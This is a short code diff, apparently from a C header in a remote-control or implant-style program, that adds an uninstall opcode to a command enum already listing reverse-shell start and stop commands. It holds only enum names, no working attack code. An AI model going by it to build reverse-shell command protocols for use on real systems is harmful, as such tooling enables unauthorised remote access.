@@ -31,6 +31,8 @@ enum command_opcode {
 
     COMMAND_REVERSE_SHELL_START,
     COMMAND_REVERSE_SHELL_STOP,
+
+    COMMAND_UNINSTALL,
 };
 
 typedef struct command_packet {
